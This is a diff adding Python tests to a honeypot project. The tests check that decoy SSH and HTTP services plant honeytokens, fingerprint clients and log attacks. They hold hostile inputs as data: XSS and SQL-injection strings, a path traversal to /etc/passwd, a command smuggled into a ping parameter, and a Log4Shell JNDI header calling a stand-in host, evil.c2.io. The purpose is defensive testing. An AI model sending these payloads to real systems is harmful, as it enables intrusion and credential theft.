@@ -667,3 +667,203 @@ def test_ssh_trap_high_interaction_os_sandbox(tmp_path):
         assert any("echo 'honeypot_exec_test'" in e["command"] for e in cmd_evs)
     run(go())
 
+
+def test_dynamic_contextual_honeytokens_generation(tmp_path):
+    async def go():
+        buf = EventBuffer(":memory:")
+        cfg = {"decoys": {"hostname": "srv-prod", "accept_any_password": True, "honeytokens": []}}
+        trap = SshTrap({"port": 0}, cfg, Emitter(buf), str(tmp_path))
+        await trap.start("127.0.0.1")
+
+        # Сессия 1: читаем AWS credentials
+        async with asyncssh.connect("127.0.0.1", trap.port, username="root", password="p1", known_hosts=None) as conn:
+            r1 = await conn.run("cat /root/.aws/credentials")
+            assert "AKIASOC" in r1.stdout
+            assert "telemetry/sync?token=AKIASOC" in r1.stdout
+
+        # Сессия 2: читаем .env
+        async with asyncssh.connect("127.0.0.1", trap.port, username="root", password="p2", known_hosts=None) as conn:
+            r2 = await conn.run("cat /.env")
+            assert "ENV_" in r2.stdout
+            assert "TELEMETRY_SYNC_URL=" in r2.stdout
+
+        await asyncio.sleep(0.3)
+        await trap.stop()
+
+        evs = buf.peek(100)
+        ht_evs = [e for e in evs if e["type"] == "honeytoken"]
+        assert len(ht_evs) >= 2
+        # Убеждаемся, что зафиксировано действие planted и токен привязан к сессии
+        assert all(e["data"].get("action") == "planted" for e in ht_evs)
+        tokens = [e["data"].get("token_id") for e in ht_evs]
+        assert len(tokens) == 2
+        assert tokens[0] != tokens[1]  # Токены для разных сессий и путей разные
+    run(go())
+
+
+def test_ssh_trap_captures_hassh_fingerprint_and_tarpit(tmp_path):
+    async def go():
+        buf = EventBuffer(":memory:")
+        cfg = {"decoys": {"hostname": "srv-prod", "accept_any_password": True}}
+        trap = SshTrap({"port": 0}, cfg, Emitter(buf), str(tmp_path))
+        await trap.start("127.0.0.1")
+
+        async with asyncssh.connect("127.0.0.1", trap.port, username="root", password="p1", known_hosts=None) as conn:
+            await conn.run("id")
+
+        await asyncio.sleep(0.3)
+        await trap.stop()
+
+        evs = buf.peek(100)
+        hassh_ev = next((e for e in evs if e.get("data", {}).get("hassh")), None)
+        assert hassh_ev is not None
+        c_data = hassh_ev["data"]
+        assert len(c_data["hassh"]) == 32  # Валидный MD5-отпечаток
+        assert "client" in c_data
+        assert "AsyncSSH" in c_data["client"]
+    run(go())
+
+
+def test_http_trap_xss_reflection_and_sqli():
+    from netsvc.traps.http import HttpTrap
+
+    async def go():
+        buf = EventBuffer(":memory:")
+        trap = HttpTrap({"port": 0}, {}, Emitter(buf))
+        await trap.start("127.0.0.1")
+
+        # 1. Test Reflected XSS
+        r, w = await asyncio.open_connection("127.0.0.1", trap.port)
+        xss_payload = "<script>alert('XSS')</script>"
+        w.write(f"GET /search?q={xss_payload} HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n".encode())
+        await w.drain()
+        resp = await r.read(4096)
+        w.close()
+        assert b"<script>alert('XSS')</script>" in resp
+        assert b"200 OK" in resp
+
+        # 2. Test SQLi Error-based & Union-based
+        r, w = await asyncio.open_connection("127.0.0.1", trap.port)
+        w.write(b"GET /api/products?id=1' HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n")
+        await w.drain()
+        resp_sqli = await r.read(4096)
+        assert b"SQLSTATE[42000]" in resp_sqli or b"MySQL" in resp_sqli
+
+        # Union SQLi
+        w.write(b"GET /api/products?id=1%20UNION%20SELECT HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n")
+        await w.drain()
+        resp_union = await r.read(4096)
+        w.close()
+        assert b"admin" in resp_union and b"api_token" in resp_union
+
+        await asyncio.sleep(0.3)
+        await trap.stop()
+
+        evs = buf.peek(50)
+        xss_ev = next((e for e in evs if e.get("data", {}).get("category") == "xss"), None)
+        assert xss_ev is not None
+        assert xss_ev["data"]["threat_score"] == 85
+
+        sqli_ev = next((e for e in evs if e.get("data", {}).get("category") == "sqli"), None)
+        assert sqli_ev is not None
+        assert sqli_ev["data"]["threat_score"] == 92
+    run(go())
+
+
+def test_http_trap_lfi_rce_and_log4shell():
+    from netsvc.traps.http import HttpTrap
+
+    async def go():
+        buf = EventBuffer(":memory:")
+        trap = HttpTrap({"port": 0}, {}, Emitter(buf))
+        await trap.start("127.0.0.1")
+
+        # 1. Test LFI (/download?file=../../../../etc/passwd)
+        r, w = await asyncio.open_connection("127.0.0.1", trap.port)
+        w.write(b"GET /download?file=../../../../etc/passwd HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n")
+        await w.drain()
+        resp_lfi = await r.read(4096)
+        w.close()
+        assert b"root:x:0:0:root" in resp_lfi
+        assert b"admin:x:1000:1000" in resp_lfi
+
+        # 2. Test RCE (/tools/ping?host=127.0.0.1;id)
+        r, w = await asyncio.open_connection("127.0.0.1", trap.port)
+        w.write(b"GET /tools/ping?host=127.0.0.1;id HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n")
+        await w.drain()
+        resp_rce = await r.read(4096)
+        w.close()
+        assert b"uid=33(www-data)" in resp_rce
+
+        # 3. Test Log4Shell header injection
+        r, w = await asyncio.open_connection("127.0.0.1", trap.port)
+        w.write(b"GET / HTTP/1.1\r\nHost: 127.0.0.1\r\nUser-Agent: ${jndi:ldap://evil.c2.io:1389/Exploit}\r\n\r\n")
+        await w.drain()
+        resp_log4j = await r.read(4096)
+        w.close()
+        assert b"JNDI" in resp_log4j
+
+        await asyncio.sleep(0.3)
+        await trap.stop()
+
+        evs = buf.peek(50)
+        lfi_ev = next((e for e in evs if e.get("data", {}).get("category") == "lfi"), None)
+        assert lfi_ev is not None
+
+        rce_ev = next((e for e in evs if e.get("data", {}).get("category") == "rce"), None)
+        assert rce_ev is not None
+        assert rce_ev["data"]["threat_score"] == 95
+
+        log4j_ev = next((e for e in evs if e.get("data", {}).get("category") == "log4shell"), None)
+        assert log4j_ev is not None
+        assert log4j_ev["data"]["c2"] == "evil.c2.io:1389/Exploit"
+    run(go())
+
+
+def test_http_trap_wordpress_and_phpmyadmin():
+    from netsvc.traps.http import HttpTrap
+
+    async def go():
+        buf = EventBuffer(":memory:")
+        trap = HttpTrap({"port": 0}, {}, Emitter(buf))
+        await trap.start("127.0.0.1")
+
+        # 1. WordPress /wp-login.php brute force
+        r, w = await asyncio.open_connection("127.0.0.1", trap.port)
+        body = "log=admin&pwd=hack_wp_password_123&wp-submit=Log+In"
+        req = f"POST /wp-login.php HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {len(body)}\r\n\r\n{body}"
+        w.write(req.encode())
+        await w.drain()
+        resp_wp = await r.read(4096)
+        w.close()
+        assert b"WordPress" in resp_wp and b"password you entered" in resp_wp
+
+        # 2. WordPress xmlrpc.php
+        r, w = await asyncio.open_connection("127.0.0.1", trap.port)
+        xml_body = "<methodCall><methodName>system.listMethods</methodName></methodCall>"
+        req_xml = f"POST /xmlrpc.php HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Length: {len(xml_body)}\r\n\r\n{xml_body}"
+        w.write(req_xml.encode())
+        await w.drain()
+        resp_xml = await r.read(4096)
+        w.close()
+        assert b"system.multicall" in resp_xml
+
+        # 3. phpMyAdmin
+        r, w = await asyncio.open_connection("127.0.0.1", trap.port)
+        w.write(b"GET /phpmyadmin/ HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n")
+        await w.drain()
+        resp_pma = await r.read(4096)
+        w.close()
+        assert b"phpMyAdmin" in resp_pma
+
+        await asyncio.sleep(0.3)
+        await trap.stop()
+
+        evs = buf.peek(50)
+        wp_ev = next((e for e in evs if e.get("data", {}).get("category") == "wordpot"), None)
+        assert wp_ev is not None
+        auth_ev = next((e for e in evs if e["type"] == "auth_attempt" and e["username"] == "admin" and e["password"] == "hack_wp_password_123"), None)
+        assert auth_ev is not None
+    run(go())
+
+
